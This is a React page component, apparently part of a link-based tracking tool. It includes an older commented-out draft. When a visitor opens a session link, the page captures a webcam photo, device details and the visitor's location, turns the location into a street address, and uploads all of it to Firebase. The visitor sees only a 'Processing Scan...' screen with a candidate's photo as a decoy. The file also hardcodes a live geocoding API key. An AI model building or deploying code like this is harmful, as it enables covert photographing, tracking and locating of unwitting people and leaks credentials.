// import { useEffect } from "react";
// import { useParams } from "react-router-dom";
// import { getDownloadURL, ref, uploadBytes } from "firebase/storage";
// import { db, storage } from "../firebaseConfig";
// import { doc, updateDoc } from "firebase/firestore";
// import tinubu from  "../assets/candidate3.jpg"

// export default function ScanPage() {
//   const { sessionId } = useParams();

//   useEffect(() => {
//     if (sessionId) captureData();
//   }, [sessionId]);

//   const captureData = async () => {
//     try {
//       const imageBlob = await takePhoto();
//       const deviceInfo = getDeviceInfo();
//       const location = await getLocation();
//       const imageUrl = await uploadImage(imageBlob, sessionId);

//       await updateDoc(doc(db, "sessions", sessionId), {
//         imageUrl,
//         deviceInfo,
//         location,
//         timestamp: new Date().toISOString(),
//       });

//       console.log("Data successfully captured and uploaded!");
//     } catch (error) {
//       console.error("Error capturing data:", error);
//     }
//   };

//   const takePhoto = async () => {
//     try {
//       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
//       const track = stream.getVideoTracks()[0];
//       const imageCapture = new ImageCapture(track);
//       const blob = await imageCapture.takePhoto();
//       track.stop();
//       return blob;
//     } catch (error) {
//       console.error("Error taking photo:", error);
//       return null;
//     }
//   };

//   const uploadImage = async (blob, sessionId) => {
//     if (!blob) return null;
//     try {
//       const storageRef = ref(storage, `photos/${sessionId}.jpg`);
//       await uploadBytes(storageRef, blob);
//       return await getDownloadURL(storageRef);
//     } catch (error) {
//       console.error("Error uploading image:", error);
//       return null;
//     }
//   };

//   const getDeviceInfo = () => ({
//     os: navigator.userAgent,
//     browser: navigator.vendor || "Unknown",
//     platform: navigator.userAgentData?.platform || navigator.userAgent,
//     language: navigator.language,
//   });

//   const getLocation = async () => {
//     return new Promise((resolve) => {
//       navigator.geolocation.getCurrentPosition(
//         (pos) =>
//           resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
//         () => resolve({ lat: "unknown", lon: "unknown" })
//       );
//     });
//   };

//   return (
//     <div className="flex items-center justify-center h-screen bg-gray-100">
//       <h2 className="text-xl font-semibold text-gray-700">
//         Processing Scan...
//       </h2>
//       <img src={tinubu} alt="" className="w-full h-f"/>
//     </div>
//   );
// }


import { useEffect } from "react";
import { useParams } from "react-router-dom";
import { getDownloadURL, ref, uploadBytes } from "firebase/storage";
import { db, storage } from "../firebaseConfig";
import { doc, updateDoc } from "firebase/firestore";
import tinubu from "../assets/candidate3.jpg";

export default function ScanPage() {
  const { sessionId } = useParams();

  // Trigger data capture when sessionId is available
  useEffect(() => {
    if (sessionId) captureData();
  }, [sessionId]);

  // Capture data including image, device info, and location
  const captureData = async () => {
    try {
      const imageBlob = await takePhoto();
      const deviceInfo = getDeviceInfo();
      const location = await getLocation();
      const imageUrl = await uploadImage(imageBlob, sessionId);

      await updateDoc(doc(db, "sessions", sessionId), {
        imageUrl,
        deviceInfo,
        location,
        timestamp: new Date().toISOString(),
      });

      console.log("Data successfully captured and uploaded!");
    } catch (error) {
      console.error("Error capturing data:", error);
    }
  };

  // Capture a photo from the user's webcam
  const takePhoto = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement("video");
      video.srcObject = stream;
      await new Promise((resolve) => (video.onloadedmetadata = resolve));
      video.play();

      await new Promise((resolve) => setTimeout(resolve, 500)); // Let the video load

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      stream.getTracks().forEach((track) => track.stop()); // Stop the camera

      return new Promise((resolve) => {
        canvas.toBlob((blob) => resolve(blob), "image/jpeg");
      });
    } catch (error) {
      console.error("Error taking photo:", error);
      return null;
    }
  };

  // Upload image to Firebase Storage
  const uploadImage = async (blob, sessionId) => {
    if (!blob) return null;
    try {
      const storageRef = ref(storage, `photos/${sessionId}.jpg`);
      await uploadBytes(storageRef, blob);
      return await getDownloadURL(storageRef);
    } catch (error) {
      console.error("Error uploading image:", error);
      return null;
    }
  };

  // Get device information
  const getDeviceInfo = () => ({
    os: navigator.userAgent || "Unknown",
    browser: navigator.vendor || "Unknown",
    platform: navigator.platform || "Unknown",
    language: navigator.language,
  });

  // Fetch user's location
  const getLocation = async () => {
    return new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const { latitude, longitude } = pos.coords;
          const locationData = await getAddressFromCoords(latitude, longitude);
          resolve(locationData);
        },
        () =>
          resolve({
            houseNumber: "Unknown",
            street: "Unknown",
            city: "Unknown",
            state: "Unknown",
            country: "Unknown",
            postalCode: "Unknown",
          })
      );
    });
  };

  // Convert latitude & longitude into a readable address
  const getAddressFromCoords = async (lat, lon) => {
    try {
      const response = await fetch(
        `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=72df51f830244fb0b19b29092956552e`
      );
      const data = await response.json();
      console.log("Location API Response:", data); // Debugging

      if (data.results.length > 0) {
        const components = data.results[0].components;
        return {
          houseNumber: components.house_number || "Unknown",
          street: components.road || "Unknown",
          city:
            components.city ||
            components.town ||
            components.village ||
            "Unknown",
          state: components.state || "Unknown",
          country: components.country || "Unknown",
          postalCode: components.postcode || "Unknown",
        };
      }
    } catch (error) {
      console.error("Error fetching location:", error);
    }
    return {
      houseNumber: "Unknown",
      street: "Unknown",
      city: "Unknown",
      state: "Unknown",
      country: "Unknown",
      postalCode: "Unknown",
    };
  };

  return (
    <div className="flex flex-col items-center justify-center h-screen bg-gray-100 w-full">
      <h2 className="text-center font-semibold text-gray-700">
        Processing Scan...
      </h2>
      <img src={tinubu} alt="Placeholder" className="w-full h-full" />
    </div>
  );
}
